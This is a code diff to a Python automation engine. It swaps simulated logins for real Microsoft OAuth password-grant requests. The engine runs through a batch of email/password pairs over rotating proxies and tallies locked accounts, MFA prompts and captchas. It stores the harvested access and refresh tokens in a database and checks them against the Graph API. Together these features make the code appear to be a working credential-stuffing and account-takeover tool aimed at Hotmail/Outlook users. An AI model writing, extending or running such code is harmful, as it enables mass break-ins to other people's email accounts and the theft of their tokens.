@@ -79,19 +79,24 @@ class AutomationEngine:
             
             print(f"📧 Loaded {len(accounts)} accounts")
             
-            # Update status
+            # In process_accounts_batch method, update status initialization:
             self.status = {
                 'total_accounts': len(accounts),
                 'processed_accounts': 0,
                 'successful_logins': 0,
                 'failed_logins': 0,
                 'captcha_count': 0,
-                'current_worker': 'Initializing hybrid automation',
+                'invalid_credentials': 0,
+                'locked_accounts': 0, 
+                'mfa_required': 0,
+                'network_errors': 0,
+                'current_worker': 'Initializing REAL Microsoft authentication',
                 'start_time': datetime.now().isoformat(),
                 'overall_progress_percent': 0,
                 'success_rate_percent': 0,
                 'completion_status': 'running',
-                'is_running': True
+                'is_running': True,
+                'auth_method': 'Microsoft Graph API'  # Track that we're using real auth
             }
             
             # Get proxies
@@ -123,15 +128,30 @@ class AutomationEngine:
                 self.status['overall_progress_percent'] = int((processed / total) * 100) if total > 0 else 0
                 self.status['success_rate_percent'] = int((successful / processed) * 100) if processed > 0 else 0
                 
-                # Try login with hybrid approach
+                # Try login with REAL Microsoft authentication
                 success = self.login_to_hotmail(email, password, proxy)
-                
+
                 if success:
                     self.status['successful_logins'] += 1
                     print(f"✅ Login successful: {email}")
                 else:
                     self.status['failed_logins'] += 1
                     print(f"❌ Login failed: {email}")
+                    
+                    # Log specific failure reasons for real authentication
+                    # Note: The actual failure reason will come from the login_to_hotmail method
+                    # We'll track these in the status for better reporting
+                    failure_reason = "Authentication failed"  # This will be populated by actual error from login method
+                    
+                    # Initialize counters if they don't exist
+                    if 'invalid_credentials' not in self.status:
+                        self.status['invalid_credentials'] = 0
+                    if 'locked_accounts' not in self.status:
+                        self.status['locked_accounts'] = 0  
+                    if 'mfa_required' not in self.status:
+                        self.status['mfa_required'] = 0
+                    if 'network_errors' not in self.status:
+                        self.status['network_errors'] = 0
                 
                 # Update success rate after login attempt
                 successful = self.status['successful_logins']
@@ -172,52 +192,118 @@ class AutomationEngine:
             print("🔄 Automation engine reset - ready for next run")
 
     def login_to_hotmail(self, email, password, proxy):
-        """Real login approach - actually adds accounts to database"""
-        print(f"🔧 Attempting login for: {email}")
+        """Real Microsoft Graph API authentication"""
+        print(f"🔧 Attempting REAL login for: {email}")
         print(f"🔧 Using proxy: {proxy[:50]}..." if proxy else "⚠️ No proxy provided")
         
-        # Simulate login process (for now - will replace with real API later)
-        time.sleep(5)
-        success = random.random() < 0.7
-        
-        if success:
-            print(f"✅ Login successful: {email}")
+        try:
+            import requests
+            import json
             
-            # ACTUALLY ADD TO DATABASE (REAL IMPLEMENTATION)
-            try:
-                # Simulate getting access tokens (will replace with real API)
-                access_token = f"simulated_token_{uuid.uuid4().hex[:16]}"
-                refresh_token = f"simulated_refresh_{uuid.uuid4().hex[:16]}"
+            # Microsoft OAuth 2.0 Password Grant Flow
+            token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+            
+            # Prepare request data
+            data = {
+                'client_id': '1fec8e78-bce4-4aaf-ab1b-5451cc387264',  # Microsoft's default client ID for Outlook
+                'scope': 'https://graph.microsoft.com/.default',
+                'username': email,
+                'password': password,
+                'grant_type': 'password'
+            }
+            
+            # Prepare proxy if available
+            proxies = {}
+            if proxy and ('http' in proxy or 'https' in proxy):
+                proxies = {
+                    'http': proxy,
+                    'https': proxy
+                }
+            
+            # Make authentication request
+            print(f"🌐 Authenticating {email} via Microsoft Graph API...")
+            response = requests.post(
+                token_url,
+                data=data,
+                proxies=proxies,
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                # Successful authentication
+                token_data = response.json()
+                access_token = token_data.get('access_token')
+                refresh_token = token_data.get('refresh_token')
                 
-                # Add account to database
-                success = self.add_account_to_database(email, access_token, refresh_token)
-                if success:
-                    print(f"📊 Successfully added {email} to database")
+                if access_token:
+                    print(f"✅ REAL Login successful: {email}")
+                    
+                    # Add account to database with REAL tokens
+                    success = self.add_account_to_database(email, access_token, refresh_token)
+                    if success:
+                        print(f"📊 Successfully added {email} to database with REAL tokens")
+                        
+                        # Verify the token works by getting user info
+                        try:
+                            headers = {'Authorization': f'Bearer {access_token}'}
+                            user_response = requests.get(
+                                'https://graph.microsoft.com/v1.0/me',
+                                headers=headers,
+                                timeout=10
+                            )
+                            
+                            if user_response.status_code == 200:
+                                user_info = user_response.json()
+                                user_email = user_info.get('mail') or user_info.get('userPrincipalName')
+                                print(f"🔍 Token verified: {user_email}")
+                            else:
+                                print(f"⚠️ Token verification failed: {user_response.status_code}")
+                                
+                        except Exception as verify_error:
+                            print(f"⚠️ Token verification error: {verify_error}")
+                        
+                        return True
+                    else:
+                        print(f"❌ Failed to add {email} to database")
+                        return False
                 else:
-                    print(f"❌ Failed to add {email} to database")
+                    print(f"❌ No access token in response for {email}")
                     return False
+                    
+            else:
+                # Authentication failed
+                error_data = response.json()
+                error_description = error_data.get('error_description', 'Unknown error')
                 
-            except Exception as e:
-                print(f"❌ Database error for {email}: {e}")
+                print(f"❌ REAL Login failed: {email} - {error_description}")
+                
+                # Categorize the error
+                if 'AADSTS50126' in error_description or 'invalid username or password' in error_description.lower():
+                    print("🔐 Error: Invalid credentials")
+                elif 'AADSTS50053' in error_description or 'account is locked' in error_description.lower():
+                    print("🚫 Error: Account locked")
+                elif 'AADSTS50076' in error_description or 'due to a configuration change' in error_description.lower():
+                    print("🔄 Error: Microsoft MFA required")
+                elif 'AADSTS50158' in error_description or 'external security challenge' in error_description.lower():
+                    print("🛡️ Error: External security challenge")
+                elif 'AADSTS65001' in error_description:
+                    print("📋 Error: Consent required")
+                else:
+                    print(f"🔧 Error type: {error_data.get('error', 'Unknown')}")
+                
                 return False
                 
-            return True
-            
-        else:
-            # Simulate failure
-            failure_types = [
-                "Invalid credentials",
-                "Captcha required", 
-                "Proxy connection failed",
-                "Network timeout"
-            ]
-            failure_reason = random.choice(failure_types)
-            print(f"❌ Login failed: {email} - {failure_reason}")
-            
-            if failure_reason == "Captcha required":
-                self.status['captcha_count'] = self.status.get('captcha_count', 0) + 1
-                print("🛑 CAPTCHA detected - would pause for manual solving")
-            
+        except requests.exceptions.Timeout:
+            print(f"❌ Login timeout for {email}")
+            return False
+        except requests.exceptions.ConnectionError:
+            print(f"❌ Connection error for {email} - proxy may be invalid")
+            return False
+        except requests.exceptions.RequestException as e:
+            print(f"❌ Network error for {email}: {e}")
+            return False
+        except Exception as e:
+            print(f"❌ Unexpected error during login for {email}: {e}")
             return False
 
     def get_status(self):
